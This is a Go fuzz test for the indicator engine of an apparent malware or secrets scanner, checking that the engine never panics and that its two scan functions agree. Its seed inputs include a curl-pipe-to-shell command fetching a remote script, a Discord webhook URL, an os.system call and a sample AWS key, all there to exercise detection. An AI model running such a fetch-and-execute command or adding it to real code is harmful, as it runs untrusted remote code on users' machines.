package stringscan

import (
	"testing"

	"github.com/fr0g-66723067-io/sc4n/internal/report"
)

// FuzzScanIndicators asserts the shared indicator engine never panics and always
// terminates on arbitrary bytes. Every content rule in the tree routes through
// it, so a panic here is a panic in the scanner.
func FuzzScanIndicators(f *testing.F) {
	f.Add([]byte("curl -fsSL http://198.51.100.7/x.sh | sh"))
	f.Add([]byte("https://discord.com/api/webhooks/123/abcdef"))
	f.Add([]byte("import os\nos.system('id')\n"))
	f.Add([]byte("AKIAIOSFODNN7EXAMPLE"))
	f.Add([]byte("\x00\xff\xfe\x01"))
	f.Add([]byte(""))

	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 1<<20 {
			t.Skip()
		}
		hits := ScanInto(data, nil)
		if len(hits) == 0 {
			// The reusable-slice form must agree with the allocating one.
			if len(Scan(data)) != 0 {
				t.Fatal("ScanInto and Scan disagree on a clean buffer")
			}
		}
		c := report.NewCollector(0)
		Emit(c.For("f.txt"), 0, data)
		_ = ScanString(string(data))
	})
}
